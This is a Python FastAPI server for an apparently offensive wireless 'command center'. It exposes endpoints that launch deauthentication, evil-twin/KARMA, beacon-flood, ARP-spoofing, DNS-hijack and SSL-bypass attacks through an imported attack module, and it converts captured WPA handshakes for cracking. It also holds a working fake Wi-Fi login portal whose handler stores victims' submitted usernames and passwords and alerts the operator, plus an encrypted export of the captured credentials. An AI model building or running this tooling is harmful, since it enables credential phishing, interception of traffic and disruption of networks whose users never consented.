from fastapi import FastAPI, Depends, WebSocket, BackgroundTasks, WebSocketDisconnect, Response, Request, Form
from fastapi.responses import StreamingResponse, HTMLResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from sqlalchemy.orm import Session
import models, database
from database import engine, get_db
import asyncio
import recon
from recon import active_interrogation
import traffic
import threading
import airmon_agent
import wireless_recon
import offensive_agent
import os
import json
import forensics_agent
from offensive_agent import CampaignManager
import comprehensive_monitor
from pydantic import BaseModel
import socket
import time
import datetime
import queue
import subprocess
from agent_brains import BrainRouter
from agent_runtime import AgentRuntime
import uvicorn
from typing import List, Dict
from dotenv import load_dotenv
from crypto_utils import encrypt_data
from accountability import log_action

# Load environment variables from .env
load_dotenv()

# --- EMERGENCY EVENT BUS ---
event_queue = queue.Queue()

# --- TACTICAL STREAM MANAGER ---

class ConnectionManager:
    def __init__(self):
        self.active_connections: list[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_text(json.dumps(message))
            except:
                # Connection might be stale
                pass

manager = ConnectionManager()
# ------------------------------

# LOCAL RECON MODE: Always On
RECON_ACTIVE = True

models.Base.metadata.create_all(bind=engine)
app = FastAPI(title="Command Center API")

# --- AGENT INTELLIGENCE CENTER ---
gemini_key = os.getenv("GEMINI_API_KEY")
if not gemini_key:
    # Tactical warning for the logs
    print("\n" + "!"*80)
    print("! CRITICAL ALERT: GEMINI_API_KEY NOT FOUND IN ENVIRONMENT".center(80))
    print("! AEGIS AGENT WILL BE INOPERATIONAL UNTIL KEY IS PROVIDED IN .env".center(80))
    print("!"*80 + "\n")

agent_router = BrainRouter(api_key=gemini_key)

@app.websocket("/api/agent/stream")
async def agent_stream(websocket: WebSocket):
    await websocket.accept()
    runtime = AgentRuntime(agent_router)
    try:
        while True:
            # Wait for user message
            data = await websocket.receive_text()
            payload = json.loads(data)
            user_msg = payload.get("message")
            
            if not user_msg:
                continue

            # Run agent loop
            async for step in runtime.step(user_msg):
                await websocket.send_json(step)
                
    except WebSocketDisconnect:
        pass
    except Exception as e:
        await websocket.send_json({"type": "error", "message": str(e)})

# ------------------------------

@app.websocket("/api/tactical/stream")
async def tactical_stream(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            # Keep connection alive and wait for client messages if any
            data = await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

async def event_processor():
    """Polls the event_queue and broadcasts to all WS clients."""
    while True:
        try:
            if not event_queue.empty():
                event = event_queue.get_nowait()
                await manager.broadcast(event)
        except:
            pass
        await asyncio.sleep(0.1)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(event_processor())

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

active_connections = []

@app.websocket("/ws/alerts")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    active_connections.append(websocket)
    try:
        while True:
            await websocket.receive_text()
    except Exception as e:
        active_connections.remove(websocket)

async def broadcast_alert(message: dict):
    for connection in active_connections:
        await connection.send_json(message)

@app.get("/api/devices")
def get_devices(db: Session = Depends(get_db)):
    return db.query(models.Device).all()

@app.get("/api/alerts")
async def get_alerts(limit: int = 100, offset: int = 0, db: Session = Depends(get_db)):
    return db.query(models.Alert).order_by(models.Alert.timestamp.desc()).offset(offset).limit(limit).all()

@app.get("/api/traffic")
async def get_traffic(limit: int = 100, offset: int = 0, db: Session = Depends(get_db)):
    return db.query(models.TrafficLog).order_by(models.TrafficLog.timestamp.desc()).offset(offset).limit(limit).all()

@app.get("/api/wireless/aps")
async def get_access_points(db: Session = Depends(get_db)):
    return db.query(models.AccessPoint).all()

@app.get("/api/wireless/clients")
async def get_wireless_clients(db: Session = Depends(get_db)):
    return db.query(models.WirelessClient).all()

@app.post("/api/wireless/clear-pulse")
def clear_pulse(db: Session = Depends(get_db)):
    """
    Tactical Pruning: 
    Removes all APs and Clients from the database that do NOT have a friendly label assigned.
    """
    try:
        # Delete un-labeled Access Points
        ap_del = db.query(models.AccessPoint).filter(models.AccessPoint.primary_name == None).delete(synchronize_session=False)
        # Delete un-labeled Clients
        cl_del = db.query(models.WirelessClient).filter(models.WirelessClient.primary_name == None).delete(synchronize_session=False)
        
        db.commit()
        return {"status": "success", "message": f"Pulse Purged: {ap_del} APs and {cl_del} Clients removed."}
    except Exception as e:
        db.rollback()
        return {"status": "error", "message": str(e)}

@app.get("/api/wireless/ap/{bssid}/clients")
def get_ap_clients(bssid: str, db: Session = Depends(get_db)):
    bssid_upper = bssid.upper()
    return db.query(models.WirelessClient).filter(models.WirelessClient.associated_bssid == bssid_upper).all()

@app.get("/api/vault")
def get_handshake_vault(db: Session = Depends(get_db)):
    return db.query(models.HandshakeVault).all()

@app.post("/api/vault/convert/{hs_id}")
def convert_handshake(hs_id: int, db: Session = Depends(get_db)):
    hs = db.query(models.HandshakeVault).filter(models.HandshakeVault.id == hs_id).first()
    if not hs:
        return {"error": "Handshake record not found"}
    
    input_path = hs.file_path
    filename = os.path.basename(input_path).replace(".pcap", ".hc22000")
    output_path = f"vault/hashes/{filename}"
    
    try:
        # Create hashes dir if not exists (already handled but good for defensive programming)
        os.makedirs("vault/hashes", exist_ok=True)
        
        # Use --all for maximum extraction success
        res = subprocess.run(["hcxpcapngtool", "--all", "-o", output_path, input_path], capture_output=True, text=True)
        
        # Verify the output file exists
        if os.path.exists(output_path):
             hs.converted_path = output_path
             db.commit()
             return {"status": "success", "converted_path": output_path}
        else:
             # If hcxpcapngtool didnt find hashes, it wont create the file.
             return {"status": "error", "message": "Incomplete Handshake. Re-run deauth and stay on channel to capture beacon context."}
    except Exception as e:
        return {"status": "error", "message": f"System Error: {str(e)}"}

@app.get("/api/system/status")
def get_system_status():
    return {
        "monitor_interface": MONITOR_IFACE,
        "active_attacks": list(offensive_agent.active_attacks.keys())
    }

class DeauthRequest(BaseModel):
    bssid: str
    client_mac: str = None
    interface: str = None # Default to None to allow backend detection

class IdentityLabelRequest(BaseModel):
    mac_address: str  # Universal key: BSSID for APs, MAC for clients/devices
    label: str        # Friendly name / alias

@app.post("/api/identity/label")
def set_identity_label(req: IdentityLabelRequest, db: Session = Depends(get_db)):
    """Assign a Friendly Name to any known MAC address or BSSID in the system."""
    identifier = req.mac_address.upper().strip()
    label = req.label.strip()
    updated = False

    # Check AccessPoints (BSSID)
    ap = db.query(models.AccessPoint).filter(models.AccessPoint.bssid == identifier).first()
    if ap:
        ap.primary_name = label if label else None
        updated = True

    # Check WirelessClients
    client = db.query(models.WirelessClient).filter(models.WirelessClient.mac_address == identifier).first()
    if client:
        client.primary_name = label if label else None
        updated = True

    # Check Devices
    device = db.query(models.Device).filter(models.Device.mac_address == identifier).first()
    if device:
        device.primary_name = label if label else None
        updated = True

    if updated:
        db.commit()
        return {"status": "success", "message": f"Operator label '{label}' assigned to {identifier}"}
    else:
        return {"status": "error", "message": f"Identifier {identifier} not found in any table."}

@app.post("/api/attack/deauth")
async def launch_deauth(req: DeauthRequest, db: Session = Depends(get_db)):
    bssid_upper = req.bssid.upper()
    ap = db.query(models.AccessPoint).filter(models.AccessPoint.bssid == bssid_upper).first()
    channel = ap.channel if ap else None
    
    # Auto-synchronize to the detected monitor interface if none provided or invalid
    target_interface = req.interface or MONITOR_IFACE or "wlan0mon"
    
    # If client_mac is provided, normalize it too
    client_mac_upper = req.client_mac.upper() if req.client_mac else None
    
    result = offensive_agent.trigger_deauth(target_interface, bssid_upper, channel, client_mac_upper)
    await broadcast_alert({"type": "ATTACK_UPDATE"})
    return result

@app.post("/api/attack/stop")
async def stop_attack(req: dict):
    result = offensive_agent.stop_deauth(req.get("bssid"))
    await broadcast_alert({"type": "ATTACK_UPDATE"})
    return result

@app.post("/api/attack/disengage")
async def global_disengage():
    """Immediately stops all active offensive engagements."""
    result = offensive_agent.stop_all_offensive_operations()
    await broadcast_alert({"type": "ATTACK_UPDATE"})
    return result

@app.post("/api/dominance/hijack/direct")
async def direct_hijack(target_ip: str, interface: str = "eth0"):
    """Auto-resolves gateway and initiates ARP interception against a single target."""
    gateway = offensive_agent.get_gateway_ip()
    result = offensive_agent.trigger_arp_spoof(interface, target_ip, gateway)
    await broadcast_alert({"type": "ATTACK_UPDATE"})
    return result

@app.post("/api/external/scan")
def legacy_silence_scan():
    """Silence handoff for decommissioned ESP8266 nodes. Avoids log clutter."""
    return {"status": "legacy_silence", "message": "Distributed Sensor Grid is decommissioned. Node should be powered down."}

@app.get("/api/attack/status")
def attack_status():
    status = offensive_agent.get_full_status()
    status["active_attacks"] = status["active_deauths"]  # backwards compat
    return status

# ─── Evil Twin Endpoints ──────────────────────────────────────────────────────

class EvilTwinRequest(BaseModel):
    bssid: str
    ssid: str
    channel: int
    interface: str = None
    karma_mode: bool = False
    captive_portal: bool = False

@app.post("/api/attack/evil-twin")
async def launch_evil_twin(req: EvilTwinRequest, db: Session = Depends(get_db)):
    iface = req.interface or MONITOR_IFACE or "wlan0mon"
    result = offensive_agent.trigger_evil_twin(
        iface, 
        req.bssid.upper(), 
        req.ssid, 
        req.channel, 
        karma_mode=req.karma_mode,
        captive_portal=req.captive_portal
    )
    await broadcast_alert({"type": "ATTACK_UPDATE"})
    return result

@app.post("/api/attack/evil-twin/stop")
async def stop_evil_twin():
    result = offensive_agent.stop_evil_twin()
    await broadcast_alert({"type": "ATTACK_UPDATE"})
    return result

# ─── Beacon Flood Endpoints ───────────────────────────────────────────────────

class BeaconFloodRequest(BaseModel):
    channel: int = 6
    interface: str = None

@app.post("/api/attack/beacon-flood")
async def launch_beacon_flood(req: BeaconFloodRequest):
    iface = req.interface or MONITOR_IFACE or "wlan0mon"
    result = offensive_agent.trigger_beacon_flood(iface, req.channel)
    await broadcast_alert({"type": "ATTACK_UPDATE"})
    return result

@app.post("/api/attack/beacon-flood/stop")
async def stop_beacon_flood():
    result = offensive_agent.stop_beacon_flood()
    await broadcast_alert({"type": "ATTACK_UPDATE"})
    return result

# ─── DNS Spoofing & SSL Bypass Endpoints (Phase 4) ───────────────────────────

class DNSSpoofRequest(BaseModel):
    interface: str = "at0"
    domains: List[Dict[str, str]]

@app.post("/api/dns-spoofing/start")
async def start_dns_spoofing(req: DNSSpoofRequest):
    result = offensive_agent.trigger_dns_spoof(req.interface, req.domains)
    await broadcast_alert({"type": "ATTACK_UPDATE"})
    return result

@app.post("/api/dns-spoofing/stop")
async def stop_dns_spoofing():
    result = offensive_agent.stop_dns_spoof()
    await broadcast_alert({"type": "ATTACK_UPDATE"})
    return result

@app.get("/api/attack/ssl-bypass")
async def get_ssl_bypass_script():
    return offensive_agent.setup_ssl_bypass()

# ─── Whitelist / Trusted Roster Endpoints ────────────────────────────────────

class TrustRequest(BaseModel):
    mac_address: str
    label: str = ""

@app.get("/api/identity/whitelist")
def get_whitelist(db: Session = Depends(get_db)):
    return db.query(models.TrustedDevice).order_by(models.TrustedDevice.added_at.desc()).all()

@app.post("/api/identity/whitelist")
def add_to_whitelist(req: TrustRequest, db: Session = Depends(get_db)):
    mac = req.mac_address.upper().strip()
    existing = db.query(models.TrustedDevice).filter(models.TrustedDevice.mac_address == mac).first()
    if existing:
        existing.label = req.label
        db.commit()
        return {"status": "updated", "message": f"{mac} already trusted — label updated."}
    entry = models.TrustedDevice(mac_address=mac, label=req.label)
    db.add(entry)
    db.commit()
    wireless_recon.invalidate_trusted_cache()
    return {"status": "added", "message": f"{mac} added to Trusted Roster."}

@app.delete("/api/identity/whitelist/{mac}")
def remove_from_whitelist(mac: str, db: Session = Depends(get_db)):
    mac = mac.upper().replace("-", ":")
    entry = db.query(models.TrustedDevice).filter(models.TrustedDevice.mac_address == mac).first()
    if not entry:
        return {"status": "error", "message": "MAC not found in Trusted Roster"}
    db.delete(entry)
    db.commit()
    wireless_recon.invalidate_trusted_cache()
    return {"status": "removed", "message": f"{mac} removed from Trusted Roster."}

# ─── Signal History Endpoint ──────────────────────────────────────────────────

@app.get("/api/signal/history/{bssid}")
def get_signal_history(bssid: str, limit: int = 60, db: Session = Depends(get_db)):
    bssid_upper = bssid.upper().replace("-", ":")
    rows = (db.query(models.SignalHistory)
              .filter(models.SignalHistory.bssid == bssid_upper)
              .order_by(models.SignalHistory.timestamp.desc())
              .limit(limit)
              .all())
    rows.reverse()  # chronological order for charting
    return [{"timestamp": r.timestamp.isoformat(), "signal_dbm": r.signal_dbm} for r in rows]

# ─── Probe History Endpoint ───────────────────────────────────────────────────

@app.get("/api/probes/history/{mac}")
def get_probe_history(mac: str, limit: int = 100, db: Session = Depends(get_db)):
    mac_upper = mac.upper().replace("-", ":")
    rows = (db.query(models.ProbeHistory)
              .filter(models.ProbeHistory.client_mac == mac_upper)
              .order_by(models.ProbeHistory.timestamp.desc())
              .limit(limit)
              .all())
    return [{"timestamp": r.timestamp.isoformat(), "probed_ssid": r.probed_ssid, "signal_dbm": r.signal_dbm} for r in rows]

# ─── Export Endpoints ─────────────────────────────────────────────────────────

import csv, io

@app.get("/api/export/json")
def export_json(db: Session = Depends(get_db)):
    aps = db.query(models.AccessPoint).all()
    clients = db.query(models.WirelessClient).all()
    def serialize_ap(ap):
        return {"bssid": ap.bssid, "ssid": ap.ssid, "channel": ap.channel, "encryption": ap.encryption,
                "signal_strength": ap.signal_strength, "last_seen": str(ap.last_seen),
                "primary_name": ap.primary_name, "last_source": ap.last_source}
    def serialize_client(c):
        return {"mac_address": c.mac_address, "vendor": c.vendor, "associated_bssid": c.associated_bssid,
                "probed_ssids": c.probed_ssids, "signal_strength": c.signal_strength,
                "last_seen": str(c.last_seen), "primary_name": c.primary_name}
    payload = {"generated_at": datetime.datetime.utcnow().isoformat(), "aps": [serialize_ap(a) for a in aps], "clients": [serialize_client(c) for c in clients]}
    return Response(content=json.dumps(payload, indent=2), media_type="application/json",
                    headers={"Content-Disposition": "attachment; filename=aegis_intel_report.json"})

@app.get("/api/export/csv")
def export_csv(db: Session = Depends(get_db)):
    aps = db.query(models.AccessPoint).all()
    clients = db.query(models.WirelessClient).all()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Type", "Identifier", "Name/SSID", "Channel", "Encryption", "Signal_dBm", "Vendor", "Last_Seen", "Alias"])
    for ap in aps:
        writer.writerow(["AccessPoint", ap.bssid, ap.ssid, ap.channel, ap.encryption, ap.signal_strength, "", str(ap.last_seen), ap.primary_name or ""])
    for c in clients:
        writer.writerow(["WirelessClient", c.mac_address, "", "", "", c.signal_strength, c.vendor, str(c.last_seen), c.primary_name or ""])
    output.seek(0)
    return StreamingResponse(iter([output.getvalue()]), media_type="text/csv",
                             headers={"Content-Disposition": "attachment; filename=aegis_intel_report.csv"})

@app.get("/api/tactical/export")
def export_tactical_json(db: Session = Depends(get_db)):
    """Exports all tactical data as a single JSON report."""
    data = {
        "metadata": {
            "version": "AEGIS_v1.5",
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "operator": "ROOT"
        },
        "devices": db.query(models.Device).all(),
        "alerts": db.query(models.Alert).all(),
        "access_points": db.query(models.AccessPoint).all(),
        "wireless_clients": db.query(models.WirelessClient).all(),
        "handshakes": db.query(models.HandshakeVault).all(),
        "evidence": db.query(models.Evidence).all()
    }
    # Convert models to dicts
    def alchemy_to_dict(obj):
        if obj is None: return None
        return {c.name: getattr(obj, c.name).isoformat() if isinstance(getattr(obj, c.name), datetime.datetime) else getattr(obj, c.name) for c in obj.__table__.columns}
    
    clean_data = {k: ([alchemy_to_dict(o) for o in v] if isinstance(v, list) else v) for k, v in data.items()}
    
    return clean_data

# ─── Captive Portal Interface ────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
@app.get("/portal", response_class=HTMLResponse)
async def captive_portal_ui():
    """Serves the tactical captive portal page."""
    return """
    <html>
    <head>
        <title>Identity Verification Required</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { background: #09090b; color: #00f2fe; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .box { background: rgba(255,255,255,0.05); padding: 2rem; border: 1px solid #00f2fe; border-radius: 8px; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 0 20px rgba(0,242,254,0.2); }
            input { width: 100%; padding: 0.8rem; margin: 1rem 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 4px; outline: none; }
            input:focus { border-color: #00f2fe; }
            button { background: #00f2fe; color: #000; border: none; padding: 1rem 2rem; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; }
            .logo { font-size: 2rem; font-weight: bold; margin-bottom: 1rem; letter-spacing: 2px; }
        </style>
    </head>
    <body>
        <div class="box">
            <div class="logo">⚡ WI-FI ACCESS ⚡</div>
            <p>Authentication required to access the tactical relay.</p>
            <form action="/portal/login" method="post">
                <input type="text" name="id" placeholder="EMPLOYEE ID / USERNAME" required>
                <input type="password" name="password" placeholder="NETWORK TOKEN / PASS" required>
                <button type="submit">Authorize Connection</button>
            </form>
            <p style="font-size: 0.7rem; color: #666; margin-top: 1rem;">SEC_VOID_PROTOCOL_v4.5 ACTIVE</p>
        </div>
    </body>
    </html>
    """

@app.post("/portal/login")
async def captive_portal_login(request: Request, id: str = Form(...), password: str = Form(...), db: Session = Depends(get_db)):
    """Captures credentials and stores them in the Evidence table."""
    client_ip = request.client.host
    content = f"ID: {id} | PASS: {password}"
    
    evidence = models.Evidence(
        target_ip=client_ip,
        data_type="Credentials",
        content=content
    )
    db.add(evidence)
    db.commit()
    
    # Broadcast an alert to the dashboard
    await broadcast_alert({"type": "ALERT", "data": {"message": f"CRITICAL: Credentials captured from {client_ip}!"}})
    
    return HTMLResponse("<html><body style='background:black;color:green;padding:2rem'>CONNECTION AUTHORIZED. ACCESS GRANTED.</body></html>")

# ─── STRATEGIC COMMAND ROUTES (PHASE 2) ──────────────────────────────────

@app.get("/api/strategic/campaigns")
async def get_campaigns(db: Session = Depends(get_db)):
    """Retrieves all Red Team campaigns and their steps."""
    campaigns = db.query(models.Campaign).all()
    results = []
    for c in campaigns:
        steps = db.query(models.CampaignStep).filter(models.CampaignStep.campaign_id == c.id).all()
        results.append({
            "id": c.id,
            "name": c.name,
            "status": c.status,
            "target": c.target_bssid,
            "start": c.start_time,
            "end": c.end_time,
            "steps": steps
        })
    return results

@app.post("/api/strategic/campaign/start")
async def start_campaign(name: str, bssid: str, db: Session = Depends(get_db)):
    """Initiates an automated 'Strategic Recon' campaign."""
    # Standard Red Team Sequence
    steps = [
        {"action": "deauth", "duration": 30},
        {"action": "karma_portal", "duration": 120}
    ]
    res = offensive_agent.CampaignManager.start_campaign(name, bssid, steps)
    return res

@app.get("/api/strategic/forensics")
async def get_forensic_incidents(db: Session = Depends(get_db)):
    """Retrieves all analyzed forensic incidents."""
    return db.query(models.ForensicIncident).all()

@app.get("/api/strategic/audit")
async def get_strategic_audit(limit: int = 50, offset: int = 0, db: Session = Depends(get_db)):
    """Retrieves the tactical operator audit trail."""
    return db.query(models.AuditLog).order_by(models.AuditLog.timestamp.desc()).offset(offset).limit(limit).all()

@app.get("/api/strategic/mission_logs")
async def get_mission_logs(limit: int = 100, db: Session = Depends(get_db)):
    """Retrieves real-time intelligence telemetry."""
    return db.query(models.MissionLog).order_by(models.MissionLog.timestamp.desc()).limit(limit).all()

@app.get("/api/strategic/report")
async def generate_mission_report(db: Session = Depends(get_db)):
    """Generates a tactical Markdown summary of the current mission state."""
    creds = db.query(models.Evidence).filter(models.Evidence.data_type == "Credential").count()
    campaigns = db.query(models.Campaign).count()
    incidents = db.query(models.ForensicIncident).count()
    logs = db.query(models.AuditLog).count()
    
    report = f"""# AEGIS COMMAND CENTER // MISSION_AFTER_ACTION_REPORT
Generated: {datetime.datetime.now().isoformat()}

## 📊 EXECUTIVE_SUMMARY
- **Total Campaigns Initiated**: {campaigns}
- **Strategic Assets Captured**: {creds}
- **Forensic Incidents Correlated**: {incidents}
- **Operator Audit Events**: {logs}

## 🏁 CAMPAIGN_HISTORY
"""
    for c in db.query(models.Campaign).all():
        report += f"- **{c.name}**: {c.status} (Target: {c.target_bssid})\n"
        
    report += "\n## 🔐 INTELLIGENCE_GATHERED\n"
    for e in db.query(models.Evidence).filter(models.Evidence.data_type == "Credential").all():
        data = json.loads(e.content)
        report += f"- **{data['host']}**: Captured {list(data['captured'].keys())} from {e.target_ip}\n"
        
    report += "\n## 🛡️ AUDIT_TRAIL_SNIPPET (Last 10)\n"
    for l in db.query(models.AuditLog).order_by(models.AuditLog.timestamp.desc()).limit(10).all():
        report += f"[{l.timestamp}] {l.action} | Target: {l.target} | Result: {l.outcome}\n"
        
    return {"status": "success", "report": report}

@app.get("/api/strategic/vault")
async def get_strategic_vault(db: Session = Depends(get_db)):
    """Retrieves all captured credentials and tactical intelligence."""
    return db.query(models.Evidence).all()

@app.post("/api/strategic/vault/export/encrypted")
async def export_encrypted_vault(passphrase: str, db: Session = Depends(get_db)):
    """Generates an AES-256 encrypted archive of the Strategic Vault."""
    try:
        vault_data = db.query(models.Evidence).all()
        # Serialize to JSON string
        raw_data = json.dumps([{"id": e.id, "type": e.data_type, "content": e.content, "timestamp": e.timestamp.isoformat()} for e in vault_data])
        
        # Encrypt
        encrypted_blob = encrypt_data(raw_data, passphrase)
        
        # Log the exfiltration
        log_action("TACTICAL_VAULT_EXFILTRATION", outcome="Encrypted Export Successful")
        
        return Response(
            content=encrypted_blob,
            media_type="application/octet-stream",
            headers={"Content-Disposition": f"attachment; filename=aegis_secure_vault_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"}
        )
    except Exception as e:
        log_action("TACTICAL_VAULT_EXFILTRATION", outcome=f"Failed: {str(e)}")
        return {"success": False, "error": str(e)}

@app.get("/api/strategic/compliance")
async def generate_compliance_audit(db: Session = Depends(get_db)):
    """
    Automated Strategic Audit:
    Checks for Open APs, Rogue AP detection alerts, and Encrypted Traffic ratio.
    """
    open_aps = db.query(models.AccessPoint).filter(models.AccessPoint.encryption == "Open").count()
    rogue_alerts = db.query(models.Alert).filter(models.Alert.severity == "Critical").count()
    
    score = 100 - (open_aps * 5) - (rogue_alerts * 10)
    score = max(0, score)
    
    findings = [
        {"standard": "PCI-DSS 4.0 / 9.4", "status": "FAIL" if rogue_alerts > 0 else "PASS", "finding": f"Found {rogue_alerts} rogue AP critical alerts."},
        {"standard": "NIST SP 800-153", "status": "WARNING" if open_aps > 0 else "PASS", "finding": f"Detected {open_aps} open/unencrypted access points in proximity."}
    ]
    
    report = models.ComplianceReport(
        standard="Global Wireless Security Baseline",
        score=score,
        findings_json=json.dumps(findings)
    )
    db.add(report)
    db.commit()
    db.refresh(report)
    
    return {
        "report_id": report.id,
        "standard": report.standard,
        "score": score,
        "timestamp": report.timestamp,
        "findings": findings
    }

# ─── AIRSPACE DOMINANCE ROUTES (PHASE 3) ──────────────────────────────────

@app.post("/api/dominance/start")
async def start_dominance_monitor(interface: str = "at0", background_tasks: BackgroundTasks = None):
    """Starts the comprehensive live traffic monitor."""
    print(f"[*] AIRSPACE DOMINANCE: Starting Live Monitor on {interface}")
    background_tasks.add_task(comprehensive_monitor.start_live_interception, interface, SIGNAL_QUEUE)
    return {"success": True, "message": f"Dominance Monitor started on {interface}"}

@app.post("/api/dominance/hijack/arp")
async def start_arp_hijack(target_ip: str, gateway_ip: str, interface: str = "eth0"):
    """Initiates ARP spoofing through the Active Interception Manager."""
    res = offensive_agent.trigger_arp_spoof(interface, target_ip, gateway_ip)
    return res

@app.post("/api/dominance/hijack/dns")
async def start_dns_hijack(domain: str, redirect_ip: str = "10.0.0.1"):
    """Stages a DNS hijack for a specific domain."""
    res = offensive_agent.trigger_dns_hijack(domain, redirect_ip)
    return res

@app.get("/api/dominance/traffic")
async def get_intercepted_traffic(db: Session = Depends(get_db)):
    """Retrieves all suspicious intercepted traffic logs."""
    return db.query(models.InterceptedTraffic).order_by(models.InterceptedTraffic.timestamp.desc()).all()

# Global variable to hold monitor interface name
MONITOR_IFACE = None

# Example startup event to boot up recon tasks
@app.on_event("startup")
async def startup_event():
    global MONITOR_IFACE
    print("Command Center online. Booting live wireless engines...")
    
    # Database migration: Ensure all columns and new tables exist
    try:
        import sqlite3
        conn = sqlite3.connect("./network_intel.db")
        cursor = conn.cursor()
        # New tables via SQLAlchemy (safe, idempotent)
        models.Base.metadata.create_all(bind=engine)
        # Column-level migrations for existing tables
        migrations = [
            "ALTER TABLE handshake_vault ADD COLUMN converted_path VARCHAR;",
            "ALTER TABLE devices ADD COLUMN primary_name VARCHAR;",
            "ALTER TABLE access_points ADD COLUMN primary_name VARCHAR;",
            "ALTER TABLE wireless_clients ADD COLUMN primary_name VARCHAR;",
            "ALTER TABLE wireless_clients ADD COLUMN ip_address VARCHAR;",
            "ALTER TABLE devices ADD COLUMN hostname VARCHAR;",
            "ALTER TABLE devices ADD COLUMN service_data VARCHAR;",
            "ALTER TABLE devices ADD COLUMN is_interrogated BOOLEAN;",
            "ALTER TABLE devices ADD COLUMN last_scan_type VARCHAR;",
            "CREATE TABLE IF NOT EXISTS audit_logs (id INTEGER PRIMARY KEY, timestamp DATETIME, action VARCHAR, target VARCHAR, outcome VARCHAR, operator VARCHAR);",
            # Index Migrations
            "CREATE INDEX IF NOT EXISTS idx_alerts_timestamp ON alerts (timestamp);",
            "CREATE INDEX IF NOT EXISTS idx_alerts_severity ON alerts (severity);",
            "CREATE INDEX IF NOT EXISTS idx_traffic_timestamp ON traffic_logs (timestamp);",
            "CREATE INDEX IF NOT EXISTS idx_evidence_timestamp ON evidence (timestamp);",
            "CREATE INDEX IF NOT EXISTS idx_campaigns_status ON campaigns (status);",
            "CREATE INDEX IF NOT EXISTS idx_campaigns_start ON campaigns (start_time);",
            "CREATE INDEX IF NOT EXISTS idx_forensics_timestamp ON forensic_incidents (timestamp);",
            "CREATE INDEX IF NOT EXISTS idx_intercepted_timestamp ON intercepted_traffic (timestamp);",
            "CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_logs (timestamp);",
            "CREATE TABLE IF NOT EXISTS mission_logs (id INTEGER PRIMARY KEY, timestamp DATETIME, severity VARCHAR, category VARCHAR, message VARCHAR, target_mac VARCHAR);",
            "CREATE INDEX IF NOT EXISTS idx_mission_logs_timestamp ON mission_logs (timestamp);",
        ]
        for migration in migrations:
            try:
                cursor.execute(migration)
                conn.commit()
                print(f"[+] Migration applied: {migration[:60]}...")
            except sqlite3.OperationalError:
                pass  # Duplicate column or index already exists
        conn.close()
        print("[+] Database schema fully synchronized.")
    except Exception as e:
        print(f"[-] Migration check failed: {e}")
    
    # 1. Establish Monitor Mode
    ifaces = airmon_agent.get_wireless_interfaces()
    if ifaces:
        # Prioritize 'wlan0' if available
        target_iface = ifaces[0]
        if 'wlan0' in ifaces:
            target_iface = 'wlan0'
        else:
            for ifc in ifaces:
                if 'mon' not in ifc:
                    target_iface = ifc
                    break
        MONITOR_IFACE = airmon_agent.enable_monitor_mode(target_iface)
    else:
        print("[-] Warning: No wireless interfaces detected for monitor mode.")

    # 2. Fire up wireless sniffer on the new mon interface
    if MONITOR_IFACE:
        t = threading.Thread(
            target=wireless_recon.start_wireless_sniffing, 
            args=(MONITOR_IFACE, event_queue, lambda: RECON_ACTIVE), 
            daemon=True
        )
        t.start()
    
    # Keeping standard traffic volume monitor active on eth0
    traffic_thread = threading.Thread(target=traffic.start_sniffing, args=("eth0",), daemon=True)
    traffic_thread.start()
    
    # 2. Start recon background loop in a separate thread to prevent blocking
    def recon_loop():
        import time
        while True:
            recon.run_recon()
            time.sleep(30) # Aggressive 30-second localized ping sweep
            
    t = threading.Thread(target=recon_loop, daemon=True)
    t.start()

@app.post("/api/strategic/forensics/deep-dive/{incident_id}")
async def trigger_forensics_deep_dive(incident_id: int, db: Session = Depends(get_db)):
    incident = db.query(models.ForensicIncident).filter(models.ForensicIncident.id == incident_id).first()
    if not incident:
        return {"error": "Incident not found"}
    # Correlate or Analyze PCAP
    analysis = json.loads(incident.evidence_json)
    return {"status": "success", "analysis": analysis}

@app.post("/api/recon/interrogate/{mac}")
async def interrogate_mac(mac: str, background_tasks: BackgroundTasks):
    """Initiates a high-fidelity deep scan on a target MAC."""
    # We run this as a background task because Nmap -sV -O can take 30s+
    log_action("TACTICAL_INTERROGATION", target=mac, outcome="Initiated")
    background_tasks.add_task(active_interrogation, mac)
    return {"status": "success", "message": f"Interrogation of {mac} initiated in background."}

# --- SERVER ENTRY POINT ---
if __name__ == "__main__":
    print("[*] AEGIS COMMAND CENTER: Launching Tactical API on port 8000")
    uvicorn.run(app, host="0.0.0.0", port=8000)
